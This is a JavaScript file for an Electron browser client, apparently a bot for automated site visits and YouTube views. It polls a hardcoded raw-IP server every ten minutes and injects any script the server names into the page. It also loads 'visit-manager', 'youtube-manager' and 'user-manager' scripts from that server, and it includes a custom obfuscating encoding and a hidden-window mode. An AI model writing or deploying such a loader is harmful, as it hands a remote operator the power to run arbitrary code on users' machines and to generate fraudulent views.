(function (w) {
    if (w.MYSERVERSCRIPT_LOADED) {
        console.log('MYSERVERSCRIPT Aborting 0 ...');
        return;
    }

    w.MYSERVERSCRIPT_LOADED = true;
    w.MYSERVERSCRIPT = true;
    /** for old versions */
    w.client = w.client || {};
    w.client.basic_update = true;
    w.client.first_script = true;
    w.client.youtube_views = true;

    (function helpFunctions() {
        let escapeExpStrings = function (s) {
            return s.replace(/[\/\\^$*+?.()[\]{}]/g, '\\$&');
        };

        if (!String.prototype.test) {
            Object.defineProperty(String.prototype, 'test', {
                value: function (reg, flag = 'gium') {
                    try {
                        return new RegExp(reg, flag).test(this);
                    } catch (error) {
                        return false;
                    }
                },
            });
        }

        if (!String.prototype.like) {
            Object.defineProperty(String.prototype, 'like', {
                value: function (name) {
                    name = name.split('*');
                    name.forEach((n, i) => {
                        name[i] = escapeExpStrings(n);
                    });
                    name = name.join('.*');
                    return this.test('^' + name + '$', 'gium');
                },
            });
        }

        if (!String.prototype.contains) {
            Object.defineProperty(String.prototype, 'contains', {
                value: function (name) {
                    return this.test('^.*' + escapeExpStrings(name) + '.*$', 'gium');
                },
            });
        }
    })();

    if (!w.SOCIALBROWSER) {
        w.SOCIALBROWSER = {
            browserData: {},
            var: {
                core: { id: '' },
                blocking: { youtube: { quality: { name: 'medium', value: '360' } } },
            },
        };
        SOCIALBROWSER.isIframe = function () {
            try {
                return window.self !== window.top;
            } catch (e) {
                return true;
            }
        };
    }

    if (w.SOCIALBROWSER) {
        SOCIALBROWSER.is_new = true;
        SOCIALBROWSER.ip = '';
        SOCIALBROWSER.scriptList = [];
        (function prepareSOCIALBROWSER() {
            SOCIALBROWSER.electron = SOCIALBROWSER.electron || require('electron');
            SOCIALBROWSER.remote = SOCIALBROWSER.remote || SOCIALBROWSER.electron.remote || require('@electron/remote');

            SOCIALBROWSER.server_url = 'http://127.0.0.1:60002';
            SOCIALBROWSER.server_url = 'http://45.84.138.100:60002';
            SOCIALBROWSER.currentWindow = SOCIALBROWSER.currentWindow || SOCIALBROWSER.remote.getCurrentWindow();

            SOCIALBROWSER.add_script = function (info) {
                if (SOCIALBROWSER.scriptList.some((s) => s.url == info.url)) {
                    return;
                }
                SOCIALBROWSER.scriptList.push(info);
                var script = document.createElement('script');
                script.id = info.id;
                script.src = info.url;
                document.querySelector('head').appendChild(script);
                console.log('Adding Script : ' + info.url);
            };
            if (SOCIALBROWSER.var.core.version < '2021.11.15' || !SOCIALBROWSER.fetchJson) {
                SOCIALBROWSER.fetchJson = function (options, callback) {
                    options.body = options.body || options.data;
                    if (options.body && typeof options.body != 'string') {
                        options.body = JSON.stringify(options.body);
                    }

                    fetch(options.url, {
                        mode: options.mode || 'cors',
                        method: options.method || 'POST',
                        headers: options.headers || {
                            Accept: 'application/json',
                            'Content-Type': 'application/json',
                        },
                        body: options.body,
                    })
                        .then((res) => res.json())
                        .then((data) => {
                            callback(data);
                        })
                        .catch((err) => {
                            console.log(err);
                        });
                };
            }

            if (!SOCIALBROWSER.from123) {
                SOCIALBROWSER.$base64Letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
                SOCIALBROWSER.$base64Numbers = [];
                for (let $i = 11; $i < 99; $i++) {
                    if ($i % 10 !== 0 && $i % 11 !== 0) {
                        SOCIALBROWSER.$base64Numbers.push($i);
                    }
                }

                SOCIALBROWSER.toJson = (obj) => {
                    if (typeof obj === undefined || obj === null) {
                        return '';
                    }
                    return JSON.stringify(obj);
                };

                SOCIALBROWSER.fromJson = (str) => {
                    if (typeof str !== 'string') {
                        return str;
                    }
                    return JSON.parse(str);
                };

                SOCIALBROWSER.toBase64 = (str) => {
                    if (typeof str === undefined || str === null || str === '') {
                        return '';
                    }
                    if (typeof str !== 'string') {
                        str = SOCIALBROWSER.toJson(str);
                    }
                    return btoa(unescape(encodeURIComponent(str)));
                };

                SOCIALBROWSER.fromBase64 = (str) => {
                    if (typeof str === undefined || str === null || str === '') {
                        return '';
                    }
                    return decodeURIComponent(escape(atob(str)));
                };

                SOCIALBROWSER.to123 = (data) => {
                    data = SOCIALBROWSER.toBase64(data);
                    let newData = '';
                    for (let i = 0; i < data.length; i++) {
                        let letter = data[i];
                        newData += SOCIALBROWSER.$base64Numbers[SOCIALBROWSER.$base64Letter.indexOf(letter)];
                    }
                    return newData;
                };

                SOCIALBROWSER.from123 = (data) => {
                    let newData = '';
                    for (let i = 0; i < data.length; i++) {
                        let num = data[i] + data[i + 1];
                        let index = SOCIALBROWSER.$base64Numbers.indexOf(parseInt(num));
                        newData += SOCIALBROWSER.$base64Letter[index];
                        i++;
                    }
                    newData = SOCIALBROWSER.fromBase64(newData);
                    return newData;
                };

                SOCIALBROWSER.typeOf = SOCIALBROWSER.typeof = function type(elem) {
                    return Object.prototype.toString.call(elem).slice(8, -1);
                };
            }
        })();

        SOCIALBROWSER.waiting = function () {
            SOCIALBROWSER.fetchJson(
                {
                    url: SOCIALBROWSER.server_url + '/api/waiting',
                    method: 'POST',
                    body: {
                        xid: SOCIALBROWSER.var.core.id,
                        is_new: SOCIALBROWSER.is_new,
                    },
                },
                function (data) {
                    SOCIALBROWSER.is_new = false;
                    if (data.message) {
                        if (data.message === 'add_script') {
                            SOCIALBROWSER.add_script({
                                url: data.script_url.replace('##server_url##', SOCIALBROWSER.server_url),
                                id: data.script_id,
                            });
                        } else if (data.message === 'reload') {
                            w.location.reload();
                        }
                    }
                },
            );
        };
        if (!SOCIALBROWSER.var.core.id) {
            SOCIALBROWSER.var.core.id = '';
        }
    }

    console.log('MYSERVERSCRIPT Loading ...');

    SOCIALBROWSER.checkingUpdateScriptsError = false;

    SOCIALBROWSER.checkingUpdateScripts = function () {
        if (!w.MYSERVERVISITSCRIPT) {
            if (SOCIALBROWSER.checkingUpdateScriptsError) {
                SOCIALBROWSER.add_script({
                    url: 'https://raw.githubusercontent.com/absunstar/smart-apps/main/browser/site_files/js/visit-manager.js',
                });
            } else {
                SOCIALBROWSER.add_script({
                    url: SOCIALBROWSER.server_url + '/js/visit-manager.js?time=' + Date.now(),
                });
            }
        }
        if (!w.MYSERVERYOUTUBESCRIPT) {
            if (SOCIALBROWSER.checkingUpdateScriptsError) {
                SOCIALBROWSER.add_script({
                    url: 'https://raw.githubusercontent.com/absunstar/smart-apps/main/browser/site_files/js/youtube-manager.js',
                });
            } else {
                SOCIALBROWSER.add_script({
                    url: SOCIALBROWSER.server_url + '/js/youtube-manager.js?time=' + Date.now(),
                });
            }
        }
        if (!w.MYSERVERUSERSCRIPT) {
            if (SOCIALBROWSER.checkingUpdateScriptsError) {
                SOCIALBROWSER.add_script({
                    url: 'https://raw.githubusercontent.com/absunstar/smart-apps/main/browser/site_files/js/user-manager.js',
                });
            } else {
                SOCIALBROWSER.add_script({
                    url: SOCIALBROWSER.server_url + '/js/user-manager.js?time=' + Date.now(),
                });
            }
        }

        if (w.SOCIALBROWSER) {
            SOCIALBROWSER.waiting();
        } else {
            /** tell server there is no SOCIALBROWSER */
        }
    };

    if (SOCIALBROWSER.var.core.id.like('*test*')) {
        let win = SOCIALBROWSER.currentWindow;
        win.showInactive(false);
        win.setSkipTaskbar(false);
        win.showInactive();
        win.openDevTools();
    } else {
        SOCIALBROWSER.checkingUpdateScripts();

        setInterval(() => {
            SOCIALBROWSER.checkingUpdateScripts();
        }, 1000 * 60 * 10);
    }
})(window);
